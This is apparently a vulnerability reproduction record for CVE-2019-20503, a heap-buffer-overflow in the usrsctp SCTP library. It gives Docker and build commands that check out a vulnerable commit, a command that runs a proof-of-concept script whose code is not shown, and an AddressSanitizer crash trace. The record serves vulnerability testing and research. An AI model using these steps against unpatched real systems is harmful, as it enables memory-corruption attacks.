### CVE-2019-20503

### PoC Links
[Other](https://bugs.chromium.org/p/project-zero/issues/detail?id=1992)

### Docker Container Run Command
```shell
docker build -t cve-2019-20503-poc .
docker run --privileged --security-opt seccomp=unconfined -itd --name CVE-2019-20503-POC cve-2019-20503-poc
docker exec -it CVE-2019-20503-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:sctplab/usrsctp.git

# Rollback to the vulnerable version.
cd usrsctp/
git reset --hard 72320b5d6257ce8c2ba5bda0ecbc640a1b178462

# Install the compilation and installation dependencies.
apt install gcc make gdb zlib1g-dev python2 pkg-config net-tools lsof automake autoconf libtool clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
export CFLAGS="-O0 -g -fsanitize=address -Wno-format-security -Wno-error=address-of-packed-member";
./bootstrap
./configure
make
make install
ldconfig

# Run the poc file.
cd /poc
nohup python2 init_ack.py &

/poc/usrsctp/programs/.libs/client 127.0.0.1 7 0 8888 7777

```

### Description
Observed that:
```shell
=================================================================
==27614==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffaac1a280 at pc 0xffffb11dfcb4 bp 0xffffaabfcc90 sp 0xffffaabfcca0
READ of size 1 at 0xffffaac1a280 thread T3 (SCTP/UDP/IP4 rc)
#0 0xffffb11dfcb0 in sctp_load_addresses_from_init netinet/sctp_pcb.c:7636
#1 0xffffb10fb554 in sctp_process_init_ack netinet/sctp_input.c:536
#2 0xffffb1103538 in sctp_handle_init_ack netinet/sctp_input.c:1522
#3 0xffffb1124398 in sctp_process_control netinet/sctp_input.c:5089
#4 0xffffb112b464 in sctp_common_input_processing netinet/sctp_input.c:5911
#5 0xffffb1059300 in recv_function_udp /poc/usrsctp/usrsctplib/user_recv_thread.c:807
#6 0xffffb0efd5c4 in start_thread nptl/pthread_create.c:442
#7 0xffffb0f65d18  (/lib/aarch64-linux-gnu/libc.so.6+0xe5d18)

0xffffaac1a280 is located 0 bytes to the right of 2048-byte region [0xffffaac19a80,0xffffaac1a280)
allocated by thread T3 (SCTP/UDP/IP4 rc) here:
#0 0xffffb137a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb104e1f8 in m_clget /poc/usrsctp/usrsctplib/user_mbuf.c:257
#2 0xffffb104e4a0 in m_getm2 /poc/usrsctp/usrsctplib/user_mbuf.c:314
#3 0xffffb109da60 in sctp_get_mbuf_for_msg netinet/sctp_bsd_addr.c:802
#4 0xffffb1058008 in recv_function_udp /poc/usrsctp/usrsctplib/user_recv_thread.c:672
#5 0xffffb0efd5c4 in start_thread nptl/pthread_create.c:442
#6 0xffffb0f65d18  (/lib/aarch64-linux-gnu/libc.so.6+0xe5d18)

Thread T3 (SCTP/UDP/IP4 rc) created by T0 here:
#0 0xffffb1326188 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216
#1 0xffffb11f2f14 in sctp_userspace_thread_create netinet/sctp_userspace.c:92
#2 0xffffb105e5c8 in recv_thread_init /poc/usrsctp/usrsctplib/user_recv_thread.c:1408
#3 0xffffb11dbe54 in sctp_pcb_init netinet/sctp_pcb.c:6856
#4 0xffffb120568c in sctp_init netinet/sctp_usrreq.c:166
#5 0xffffb105ffb0 in usrsctp_init /poc/usrsctp/usrsctplib/user_socket.c:112
#6 0xaaaadaaf8fc4 in main /poc/usrsctp/programs/client.c:110
#7 0xffffb0ea73f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#8 0xffffb0ea74c8 in __libc_start_main_impl ../csu/libc-start.c:392
#9 0xaaaadaaf60ac in _start (/poc/usrsctp/programs/.libs/client+0x30ac)

SUMMARY: AddressSanitizer: heap-buffer-overflow netinet/sctp_pcb.c:7636 in sctp_load_addresses_from_init
Shadow bytes around the buggy address:
0x200ff5583400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5583410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5583420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5583430: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff5583440: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff5583450:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5583460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5583470: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5583480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff5583490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff55834a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==27614==ABORTING
```



